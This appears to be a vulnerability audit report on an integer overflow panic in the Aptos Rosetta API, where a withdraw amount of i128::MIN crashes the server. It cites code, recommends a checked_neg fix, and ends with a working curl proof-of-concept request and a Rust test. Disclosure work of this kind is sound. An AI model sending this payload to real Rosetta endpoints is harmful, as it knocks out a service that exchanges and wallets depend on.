# Audit Report

## Title
Integer Overflow Panic in Rosetta API Transfer Validation Causes Denial of Service

## Summary
The Rosetta API's transfer validation logic contains an integer overflow vulnerability that causes a panic when processing withdraw operations with the minimum i128 value (i128::MIN). An unauthenticated attacker can exploit this to crash the Rosetta API server by sending specially crafted transfer operations through public endpoints.

## Finding Description

The vulnerability exists in the `Transfer::extract_transfer` function where transfer operations are validated. The function extracts withdraw and deposit amounts as i128 values, then validates that the withdraw amount is the negative of the deposit amount to ensure conservation of value. [1](#0-0) 

The critical flaw occurs at the comparison operation where `withdraw_value` is negated. When an attacker provides a withdraw operation with the value "-170141183460469231731687303715884105728" (i128::MIN), attempting to negate this value causes an integer overflow. [2](#0-1) 

Since Aptos Core is compiled with `overflow-checks = true` in the release profile, this overflow triggers a panic rather than wrapping around. The panic crashes the API server thread handling the request.

The attack flow is:

1. Attacker sends a POST request to `/construction/preprocess` or `/construction/payloads` with operations containing:
   - Withdraw operation: `value = "-170141183460469231731687303715884105728"` (i128::MIN)
   - Deposit operation: any valid positive i128 value

2. The request is processed through `InternalOperation::extract` which calls `Transfer::extract_transfer` [3](#0-2) 

3. Both amount strings successfully parse to i128 values via `i128::from_str` [4](#0-3) 

4. The negation operation `-withdraw_value` where `withdraw_value == i128::MIN` causes overflow
5. The overflow check triggers a panic, crashing the server

The endpoints are publicly accessible with CORS enabled for any origin and no authentication required: [5](#0-4) 

## Impact Explanation

This vulnerability enables a Denial of Service attack against the Rosetta API service. According to the Aptos bug bounty program, "API crashes" are classified as **High Severity** (up to $50,000). 

While this does not affect blockchain consensus, validator operations, or on-chain state, it impacts the availability of a critical infrastructure component that exchanges and wallets rely on for blockchain integration. An attacker can repeatedly trigger this panic to keep the Rosetta API service unavailable, preventing legitimate users from:
- Constructing transactions via the Rosetta standard interface
- Querying account balances through Rosetta endpoints  
- Integrating with Aptos using the Rosetta specification

The vulnerability does not corrupt balance tracking on the blockchain itself, but it renders the Rosetta API unusable for balance queries and transaction construction.

## Likelihood Explanation

**Likelihood: High**

The attack is trivially exploitable:
- No authentication required
- No rate limiting on construction endpoints
- Simple HTTP POST request with crafted JSON payload
- Attacker needs no special privileges or blockchain knowledge
- Attack can be automated and repeated indefinitely
- No computational resources required beyond crafting the request

The only requirement is knowledge of the i128::MIN edge case, which is well-documented in Rust documentation.

## Recommendation

Implement explicit validation to prevent i128::MIN values before performing the negation operation. Use Rust's checked arithmetic operations that return `Option` instead of panicking:

```rust
// Replace the unsafe negation with checked arithmetic
let withdraw_value = i128::from_str(&withdraw_amount.value)
    .map_err(|_| ApiError::InvalidTransferOperations(Some("Withdraw amount is invalid")))?;
let deposit_value = i128::from_str(&deposit_amount.value)
    .map_err(|_| ApiError::InvalidTransferOperations(Some("Deposit amount is invalid")))?;

// Use checked_neg() to safely handle i128::MIN
let negated_withdraw = withdraw_value.checked_neg()
    .ok_or_else(|| ApiError::InvalidTransferOperations(Some(
        "Withdraw amount cannot be i128::MIN"
    )))?;

// Now safe to compare
if negated_withdraw != deposit_value {
    return Err(ApiError::InvalidTransferOperations(Some(
        "Withdraw amount must be equal to negative of deposit amount",
    )));
}
```

Alternatively, add an explicit check before negation:

```rust
// Reject i128::MIN explicitly
if withdraw_value == i128::MIN {
    return Err(ApiError::InvalidTransferOperations(Some(
        "Withdraw amount is outside valid range"
    )));
}
```

## Proof of Concept

```bash
# Crash the Rosetta API server with a single HTTP request
curl -X POST http://localhost:8080/construction/preprocess \
  -H "Content-Type: application/json" \
  -d '{
    "network_identifier": {
      "blockchain": "aptos",
      "network": "testnet"
    },
    "operations": [
      {
        "operation_identifier": {"index": 0},
        "type": "withdraw",
        "account": {
          "address": "0x1"
        },
        "amount": {
          "value": "-170141183460469231731687303715884105728",
          "currency": {
            "symbol": "APT",
            "decimals": 8
          }
        }
      },
      {
        "operation_identifier": {"index": 1},
        "type": "deposit",
        "account": {
          "address": "0x2"
        },
        "amount": {
          "value": "100000000",
          "currency": {
            "symbol": "APT",
            "decimals": 8
          }
        }
      }
    ]
  }'
```

**Expected Result:** The server panics with an overflow error and the API becomes unresponsive until restarted.

**Rust Unit Test:**

```rust
#[test]
#[should_panic(expected = "overflow")]
fn test_i128_min_overflow_panic() {
    use std::str::FromStr;
    
    let withdraw_value = i128::from_str("-170141183460469231731687303715884105728").unwrap();
    assert_eq!(withdraw_value, i128::MIN);
    
    // This will panic with overflow-checks enabled
    let _ = -withdraw_value;
}
```

### Citations

**File:** crates/aptos-rosetta/src/types/objects.rs (L127-130)
```rust
    pub fn value(&self) -> ApiResult<i128> {
        i128::from_str(&self.value)
            .map_err(|_| ApiError::InvalidTransferOperations(Some("Withdraw amount is invalid")))
    }
```

**File:** crates/aptos-rosetta/src/types/objects.rs (L2899-2909)
```rust
        let withdraw_value = i128::from_str(&withdraw_amount.value)
            .map_err(|_| ApiError::InvalidTransferOperations(Some("Withdraw amount is invalid")))?;
        let deposit_value = i128::from_str(&deposit_amount.value)
            .map_err(|_| ApiError::InvalidTransferOperations(Some("Deposit amount is invalid")))?;

        // We can't create or destroy coins, they must be negatives of each other
        if -withdraw_value != deposit_value {
            return Err(ApiError::InvalidTransferOperations(Some(
                "Withdraw amount must be equal to negative of deposit amount",
            )));
        }
```

**File:** Cargo.toml (L921-923)
```text
[profile.release]
debug = true
overflow-checks = true
```

**File:** crates/aptos-rosetta/src/construction.rs (L1434-1435)
```rust
    // Determine the actual operation from the collection of Rosetta [Operation]
    let internal_operation = InternalOperation::extract(&server_context, &request.operations)?;
```

**File:** crates/aptos-rosetta/src/lib.rs (L174-186)
```rust
        .or(construction::payloads_route(context.clone()))
        .or(construction::preprocess_route(context.clone()))
        .or(construction::submit_route(context.clone()))
        .or(network::list_route(context.clone()))
        .or(network::options_route(context.clone()))
        .or(network::status_route(context.clone()))
        .or(health_check_route(context))
        .with(
            warp::cors()
                .allow_any_origin()
                .allow_methods(vec![Method::GET, Method::POST])
                .allow_headers(vec![warp::http::header::CONTENT_TYPE]),
        )
```
